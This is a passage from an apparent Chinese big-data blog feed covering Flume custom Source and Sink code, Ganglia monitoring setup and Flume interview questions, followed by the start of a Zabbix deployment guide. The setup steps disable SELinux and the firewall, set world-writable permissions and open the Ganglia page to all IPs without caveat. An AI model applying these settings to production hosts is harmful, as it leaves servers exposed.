rel="noopener" title="自定义 source 的接口">自定义 source 的接口</a>，根据官方说明自定义MySource 需要继承 AbstractSource 类并实现 Configurable 和 PollableSource 接口。实现相应方法：</p><ul><li><code>getBackOffSleepIncrement() </code>：backoff 步长</li><li><code>getMaxBackOffSleepInterval()</code>：backoff 最长时间</li><li><code>configure(Context context)</code>：初始化 context（读取配置文件内容）</li><li><code>process()</code>：获取数据封装成 event 并写入 channel，这个方法将被循环调用</li></ul><p>使用场景：读取 MySQL 数据或者其他文件系统</p><h3 id="6-2-需求与分析">6.2 需求与分析</h3><p>使用 flume 接收数据，并给每条数据添加前缀，输出到控制台。前缀可从 flume 配置文件中配置</p><p><img src="http://qnypic.shawncoding.top/blog/202401251329741.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202401251329742.png" alt></p><h3 id="6-3-编码实现">6.3 编码实现</h3><p>导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flume<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flume-ng-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建com.atguigu.source.MySource</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySource</span> <span class="keyword">extends</span> <span class="title">AbstractSource</span> <span class="keyword">implements</span></span></span><br><span class="line"><span class="class">        <span class="title">Configurable</span>, <span class="title">PollableSource</span> </span>&#123;</span><br><span class="line">    <span class="comment">//定义配置文件将来要读取的字段</span></span><br><span class="line">    <span class="keyword">private</span> Long delay;</span><br><span class="line">    <span class="keyword">private</span> String field;</span><br><span class="line">    <span class="comment">//初始化配置信息</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        delay = context.getLong(<span class="string">"delay"</span>);</span><br><span class="line">        field = context.getString(<span class="string">"field"</span>, <span class="string">"Hello!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Status <span class="title">process</span><span class="params">()</span> <span class="keyword">throws</span> EventDeliveryException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建事件头信息</span></span><br><span class="line">            HashMap&lt;String, String&gt; hearderMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            <span class="comment">//创建事件</span></span><br><span class="line">            SimpleEvent event = <span class="keyword">new</span> SimpleEvent();</span><br><span class="line">            <span class="comment">//循环封装事件</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">                <span class="comment">//给事件设置头信息</span></span><br><span class="line">                event.setHeaders(hearderMap);</span><br><span class="line">                <span class="comment">//给事件设置内容</span></span><br><span class="line">                event.setBody((field + i).getBytes());</span><br><span class="line">                <span class="comment">//将事件写入 channel，这里面包括了拦截器和channel选择器(包括事务)，可以结合之前的流程读一下</span></span><br><span class="line">                getChannelProcessor().processEvent(event);</span><br><span class="line">                Thread.sleep(delay);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> Status.BACKOFF;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Status.READY;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getBackOffSleepIncrement</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getMaxBackOffSleepInterval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将写好的代码打包，并放到 flume 的 lib 目录（<code>/opt/module/flume</code>）下，然后创建配置文件，启动可以查看效果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a1.sources.r1.type = com.atguigu.source.MySource</span><br><span class="line">a1.sources.r1.delay = 1000</span><br><span class="line"><span class="comment"># a1.sources.r1.field = atguigu</span></span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a1.sinks.k1.type = logger</span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><h2 id="7、自定义-Sink">7、自定义 Sink</h2><h3 id="7-1-概述">7.1 概述</h3><p>Sink 不断地轮询 Channel 中的事件且批量地移除它们，并将这些事件批量写入到存储或索引系统、或者被发送到另一个 Flume Agent。Sink 是完全事务性的。在从Channel 批量删除数据之前，每个 Sink 用 Channel 启动一个事务。批量事件一旦成功写出到存储系统或下一个 Flume Agent，Sink 就利用 Channel 提交事务。事务一旦被提交，该 Channel 从自己的内部缓冲区删除事件。</p><p>Sink 组件目的地包括 hdfs、logger、avro、thrift、ipc、file、null、HBase、solr、自定义。官方提供的 Sink 类型已经很多，但是有时候并不能满足实际开发当中的需求，此时我们就需要根据实际需求自定义某些 Sink。官方也提供了<a href="https://flume.apache.org/FlumeDeveloperGuide.html#sink" target="_blank" rel="noopener" title="自定义 sink 的接口">自定义 sink 的接口</a>：MySink 需要继承 AbstractSink 类并实现 Configurable 接口。实现相应方法：</p><ul><li><code>configure(Context context)</code>：初始化 context（读取配置文件内容）</li><li><code>process()</code>：从 Channel 读取获取数据（event），这个方法将被循环调用。使用场景：读取 Channel 数据写入 MySQL 或者其他文件系统。</li></ul><h3 id="7-2-需求">7.2 需求</h3><p>使用 flume 接收数据，并在 Sink 端给每条数据添加前缀和后缀，输出到控制台。前后缀可在 flume 任务配置文件中配置</p><p><img src="http://qnypic.shawncoding.top/blog/202401251329743.png" alt></p><h3 id="7-3-编码实现">7.3 编码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySink</span> <span class="keyword">extends</span> <span class="title">AbstractSink</span> <span class="keyword">implements</span> <span class="title">Configurable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建 Logger 对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOG =</span><br><span class="line">            LoggerFactory.getLogger(AbstractSink<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">private</span> String prefix;</span><br><span class="line">    <span class="keyword">private</span> String suffix;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Status <span class="title">process</span><span class="params">()</span> <span class="keyword">throws</span> EventDeliveryException </span>&#123;</span><br><span class="line">        <span class="comment">//声明返回值状态信息</span></span><br><span class="line">        Status status;</span><br><span class="line">        <span class="comment">//获取当前 Sink 绑定的 Channel</span></span><br><span class="line">        Channel ch = getChannel();</span><br><span class="line">        <span class="comment">//获取事务</span></span><br><span class="line">        Transaction txn = ch.getTransaction();</span><br><span class="line">        <span class="comment">//声明事件</span></span><br><span class="line">        Event event;</span><br><span class="line">        <span class="comment">//开启事务</span></span><br><span class="line">        txn.begin();</span><br><span class="line">        <span class="comment">//读取 Channel 中的事件，直到读取到事件结束循环</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            event = ch.take();</span><br><span class="line">            <span class="keyword">if</span> (event != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//处理事件（打印）</span></span><br><span class="line">            LOG.info(prefix + <span class="keyword">new</span> String(event.getBody()) +</span><br><span class="line">                    suffix);</span><br><span class="line">            <span class="comment">//事务提交</span></span><br><span class="line">            txn.commit();</span><br><span class="line">            status = Status.READY;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">//遇到异常，事务回滚</span></span><br><span class="line">            txn.rollback();</span><br><span class="line">            status = Status.BACKOFF;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//关闭事务</span></span><br><span class="line">            txn.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//读取配置文件内容，有默认值</span></span><br><span class="line">        prefix = context.getString(<span class="string">"prefix"</span>, <span class="string">"hello:"</span>);</span><br><span class="line">        <span class="comment">//读取配置文件内容，无默认值</span></span><br><span class="line">        suffix = context.getString(<span class="string">"suffix"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将写好的代码打包，并放到 flume 的 lib 目录（/opt/module/flume）下，然后编写配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a1.sources.r1.type = netcat</span><br><span class="line">a1.sources.r1.bind = localhost</span><br><span class="line">a1.sources.r1.port = 44444</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a1.sinks.k1.type = com.atguigu.MySink</span><br><span class="line"><span class="comment">#a1.sinks.k1.prefix = atguigu:</span></span><br><span class="line">a1.sinks.k1.suffix = :atguigu</span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><p>开启任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bin/flume-ng agent -c conf/ -f job/mysink.conf -n a1 -Dflume.root.logger=INFO,console</span><br><span class="line"><span class="comment"># 开启</span></span><br><span class="line">nc localhost 44444</span><br></pre></td></tr></table></figure><h2 id="8、Flume-数据流监控">8、Flume 数据流监控</h2><h3 id="8-1-Ganglia-的安装与部署">8.1 Ganglia 的安装与部署</h3><p>Ganglia 由 gmond、gmetad 和 gweb 三部分组成。</p><ul><li>gmond（Ganglia Monitoring Daemon）是一种轻量级服务，安装在每台需要收集指标数据的节点主机上。使用 gmond，你可以很容易收集很多系统指标数据，如 CPU、内存、磁盘、网络和活跃进程的数据等。</li><li>gmetad（Ganglia Meta Daemon）整合所有信息，并将其以 RRD 格式存储至磁盘的服务。</li><li>gweb（Ganglia Web）Ganglia 可视化工具，gweb 是一种利用浏览器显示 gmetad 所存储数据的 PHP 前端。在 Web 界面中以图表方式展现集群的运行状态下收集的多种不同指标数据</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 102 103 104 分别安装 epel-release</span></span><br><span class="line">sudo yum -y install epel-release</span><br><span class="line"><span class="comment"># 在 102 安装</span></span><br><span class="line">sudo yum -y install ganglia-gmetad</span><br><span class="line">sudo yum -y install ganglia-web</span><br><span class="line">sudo yum -y install ganglia-gmond</span><br><span class="line"><span class="comment"># 在 103 和 104 安装</span></span><br><span class="line">sudo yum -y install ganglia-gmond</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 102 修改配置文件/etc/httpd/conf.d/ganglia.conf</span></span><br><span class="line">sudo vim /etc/ganglia/gmetad.conf</span><br><span class="line"><span class="comment"># 修改为：data_source "my cluster" hadoop102</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 102 103 104 修改配置文件/etc/ganglia/gmond.conf</span></span><br><span class="line">sudo vim /etc/ganglia/gmond.conf</span><br><span class="line"><span class="comment"># 修改三个地方，name = "my cluster"；host = hadoop102；bind = 0.0.0.0</span></span><br><span class="line">cluster &#123;</span><br><span class="line"> name = <span class="string">"my cluster"</span></span><br><span class="line"> owner = <span class="string">"unspecified"</span></span><br><span class="line"> latlong = <span class="string">"unspecified"</span></span><br><span class="line"> url = <span class="string">"unspecified"</span></span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">#bind_hostname = yes # Highly recommended, soon to be default.</span></span><br><span class="line"> <span class="comment"># This option tells gmond to use a source </span></span><br><span class="line">address</span><br><span class="line"> <span class="comment"># that resolves to the machine's hostname. </span></span><br><span class="line">Without</span><br><span class="line"> <span class="comment"># this, the metrics may appear to come from </span></span><br><span class="line">any</span><br><span class="line"> <span class="comment"># interface and the DNS names associated with</span></span><br><span class="line"> <span class="comment"># those IPs will be used to create the RRDs.</span></span><br><span class="line"> <span class="comment"># mcast_join = 239.2.11.71</span></span><br><span class="line"> <span class="comment"># 数据发送给 hadoop102</span></span><br><span class="line"> host = hadoop102</span><br><span class="line"> port = 8649</span><br><span class="line"> ttl = 1</span><br><span class="line">&#125;</span><br><span class="line">udp_recv_channel &#123;</span><br><span class="line"> <span class="comment"># mcast_join = 239.2.11.71</span></span><br><span class="line"> port = 8649</span><br><span class="line"><span class="comment"># 接收来自任意连接的数据</span></span><br><span class="line"> <span class="built_in">bind</span> = 0.0.0.0</span><br><span class="line"> retry_bind = <span class="literal">true</span></span><br><span class="line"> <span class="comment"># Size of the UDP buffer. If you are handling lots of metrics </span></span><br><span class="line">you really</span><br><span class="line"> <span class="comment"># should bump it up to e.g. 10MB or even higher.</span></span><br><span class="line"> <span class="comment"># buffer = 10485760</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 102 修改配置文件/etc/selinux/config</span></span><br><span class="line">sudo vim /etc/selinux/config</span><br><span class="line"><span class="comment"># 设置SELINUX=disabled</span></span><br><span class="line"><span class="comment"># 上面生效要重启，可以暂时生效</span></span><br><span class="line">sudo setenforce 0</span><br><span class="line"></span><br><span class="line"><span class="comment">#  设置权限</span></span><br><span class="line">sudo chmod -R 777 /var/lib/ganglia</span><br><span class="line"><span class="comment"># 去hadoop102设置所有ip访问</span></span><br><span class="line">sudo vim /etc/httpd/conf.d/ganglia.conf</span><br><span class="line"><span class="comment"># 添加Require all granted</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开网页启动（感觉界面很low）</span></span><br><span class="line">http://hadoop102/ganglia</span><br></pre></td></tr></table></figure><h3 id="8-2-操作-Flume-测试监控">8.2 操作 Flume 测试监控</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bin/flume-ng agent \</span><br><span class="line">-c conf/ \</span><br><span class="line">-n a1 \</span><br><span class="line">-f job/flume-netcat-logger.conf \</span><br><span class="line">-Dflume.root.logger=INFO,console \</span><br><span class="line">-Dflume.monitoring.type=ganglia \</span><br><span class="line">-Dflume.monitoring.hosts=hadoop102:8649</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送</span></span><br><span class="line">nc localhost 44444</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202401251329744.png" alt></p><h1>四、企业真实面试题（重点）</h1><h2 id="1、Flume-的-Source，Sink，Channel-的作用？你们-Source-是什么类型？">1、Flume 的 Source，Sink，Channel 的作用？你们 Source 是什么类型？</h2><ul><li>Source 组件是专门用来收集数据的，可以处理各种类型、各种格式的日志数据，包括 avro、thrift、exec、jms、spooling directory、netcat、sequence generator、syslog、http、legacy</li><li>Channel 组件对采集到的数据进行缓存，可以存放在 Memory 或 File 中</li><li>Sink 组件是用于把数据发送到目的地的组件，目的地包括 Hdfs、Logger、avro、thrift、ipc、file、Hbase、solr、自定义</li></ul><h2 id="2、Flume-的-Channel-Selectors">2、Flume 的 Channel Selectors</h2><p><img src="http://qnypic.shawncoding.top/blog/202401251329745.png" alt></p><h2 id="3、Flume-参数调优">3、Flume 参数调优</h2><ul><li><p><strong>Source</strong></p><p>增加 Source 个（使用 Tair Dir Source 时可增加 FileGroups 个数）可以增大 Source的读取数据的能力。例如：当某一个目录产生的文件过多时需要将这个文件目录拆分成多个文件目录，同时配置好多个 Source 以保证 Source 有足够的能力获取到新产生的数据。batchSize 参数决定 Source 一次批量运输到 Channel 的 event 条数，适当调大这个参数可以提高 Source 搬运Event 到 Channel 时的性能。</p></li><li><p><strong>Channel</strong></p><p>type 选择 memory 时 Channel 的性能最好，但是如果 Flume 进程意外挂掉可能会丢失数据。type 选择 file 时Channel 的容错性更好，但是性能上会比 memory channel 差。使用 file Channel 时 dataDirs 配置多个不同盘下的目录可以提高性能。Capacity 参数决定 Channel 可容纳最大的 event 条数。transactionCapacity 参数决定每次 Source 往 channel 里面写的最大 event 条数和每次 Sink 从 channel 里面读的最大 event 条数。<strong>transactionCapacity</strong> <strong>需要大于</strong> <strong>Source</strong> <strong>和</strong> <strong>Sink</strong> <strong>的</strong> <strong>batchSize</strong> <strong>参数</strong></p></li><li><p><strong>Sink</strong></p><p>增加 Sink 的个数可以增加 Sink 消费 event 的能力。Sink 也不是越多越好够用就行，过多的 Sink 会占用系统资源，造成系统资源不必要的浪费。batchSize 参数决定 Sink 一次批量从 Channel 读取的 event 条数，适当调大这个参数可以提高 Sink 从 Channel 搬出 event 的性能</p></li></ul><h2 id="4、Flume-的事务机制">4、Flume 的事务机制</h2><p>Flume 的事务机制（类似数据库的事务机制）：Flume 使用两个独立的事务分别负责从Soucrce 到 Channel，以及从 Channel 到 Sink 的事件传递。</p><p>比如 spooling directory source 为文件的每一行创建一个事件，一旦事务中所有的事件全部传递到 Channel 且提交成功，那么Soucrce 就将该文件标记为完成。同理，事务以类似的方式处理从 Channel 到 Sink 的传递过程，如果因为某种原因使得事件无法记录，那么事务将会回滚。且所有的事件都会保持到 Channel 中，等待重新传递。</p><h2 id="5、Flume-采集数据会丢失吗">5、Flume 采集数据会丢失吗?</h2><p>根据 Flume 的架构原理，Flume 是不可能丢失数据的，其内部有完善的事务机制， Source 到 Channel 是事务性的，Channel 到 Sink 是事务性的，因此这两个环节不会出现数据的丢失，唯一可能丢失数据的情况是 Channel 采用 memoryChannel，agent 宕机导致数据丢失，或者 Channel 存储数据已满，导致 Source 不再写入，未写入的数据丢失。</p><p>Flume 不会丢失数据，但是有可能造成数据的重复，例如数据已经成功由 Sink 发出，但是没有接收到响应，Sink 会再次发送数据，此时可能会导致数据的重复</p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、Flume 入门概述&lt;/h1&gt;
&lt;h2 id=&quot;1、概述&quot;&gt;1、概述&lt;/h2&gt;
&lt;p&gt;Flume 是Cloudera 提供的一个高可用的，高可靠的，分布式的海量日志采集、聚合和传输的系统。Flume 基于流式架构，灵活简单。Flume最主要的作用就是，实时读取服务器本地磁盘的数据(或者网络端口数据)，将数据写入到HDFS&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>集群监控Zabbix和Prometheus</title>
    <link href="https://blog.shawncoding.top/posts/12bf1070.html"/>
    <id>https://blog.shawncoding.top/posts/12bf1070.html</id>
    <published>2023-12-13T08:39:26.000Z</published>
    <updated>2024-02-29T12:00:08.218Z</updated>
    
    <content type="html"><![CDATA[<h1>集群监控Zabbix和Prometheus</h1><h1>一、Zabbix入门概述</h1><h2 id="1、Zabbix概述">1、Zabbix概述</h2><p>Zabbix是一款能够监控各种网络参数以及服务器健康性和完整性的软件。Zabbix使用灵活的通知机制，允许用户为几乎任何事件配置基于邮件的告警。这样可以快速反馈服务器的问题。基于已存储的数据，Zabbix提供了出色的报告和数据可视化功能</p><a id="more"></a><h2 id="2、Zabbix-基础架构">2、Zabbix 基础架构</h2><p><img src="http://qnypic.shawncoding.top/blog/202312131435398.png" alt></p><h2 id="3、Zabbix部署">3、Zabbix部署</h2><blockquote><p>官网：<a href="https://www.zabbix.com/cn/download" target="_blank" rel="noopener" title="https://www.zabbix.com/cn/download">https://www.zabbix.com/cn/download</a></p></blockquote><h3 id="3-1-前提环境准备">3.1 前提环境准备</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果集群开启，先关闭集群。因为安装Zabbix前，需要重启虚拟机。如果之前弄过了就不需要了</span></span><br><span class="line">cluster.sh stop</span><br><span class="line"><span class="comment"># 关闭防火墙（3台节点，已关闭）</span></span><br><span class="line">sudo service iptables stop</span><br><span class="line">sudo chkconfig iptables off</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭SELinux（hadoop102）</span></span><br><span class="line"><span class="comment"># 修改配置文件/etc/selinux/config</span></span><br><span class="line">sudo vim /etc/selinux/config</span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line">SELINUX=disabled</span><br><span class="line"><span class="comment"># 重启服务器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ================配置Zabbix yum源（3台节点）==========</span></span><br><span class="line"><span class="comment"># 安装yum仓库，安装zabbix的yum仓库，三台机器都要运行</span></span><br><span class="line">sudo rpm -Uvh https://mirrors.aliyun.com/zabbix/zabbix/5.0/rhel/7/x86_64/zabbix-release-5.0-1.el7.noarch.rpm</span><br><span class="line"><span class="comment"># 安装Software Collections仓库</span></span><br><span class="line">sudo yum install -y centos-release-scl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =============修改zabbix仓库配置文件(三台节点)===========</span></span><br><span class="line"><span class="comment"># 修改为阿里云镜像</span></span><br><span class="line"><span class="comment"># 查看原始zabbix.repo文件</span></span><br><span class="line">sudo cat /etc/yum.repos.d/zabbix.repo</span><br><span class="line"><span class="comment"># 执行以下命令完成全局替换</span></span><br><span class="line">sudo sed -i <span class="string">'s/http:\/\/repo.zabbix.com/https:\/\/mirrors.aliyun.com\/zabbix/g'</span> /etc/yum.repos.d/zabbix.repo</span><br><span class="line"><span class="comment"># 查看修改之后的zabbix.repo文件</span></span><br><span class="line">sudo cat /etc/yum.repos.d/zabbix.repo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用zabbix-web仓库,仅在102机器进行修改</span></span><br><span class="line"><span class="comment"># 打开/etc/yum.repos.d/zabbix.repo文件，做如下修改</span></span><br><span class="line">[zabbix-frontend]</span><br><span class="line">...</span><br><span 